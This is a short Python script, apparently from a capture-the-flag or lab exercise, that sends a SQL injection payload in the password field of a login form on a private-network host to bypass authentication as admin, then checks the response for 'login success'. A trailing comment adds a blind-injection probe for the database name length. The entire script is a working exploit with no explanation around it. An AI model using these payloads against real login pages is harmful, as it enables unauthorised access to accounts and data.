import time
import requests
url = "http://10.51.0.8"
post_data = {
        'pass':"1'or''='';#",
        'user':'admin',
        }
r = requests.post(url,post_data)
print(r.text)
if "login success" in r.text:
        print("yes")
# ^(length(database())=5);#'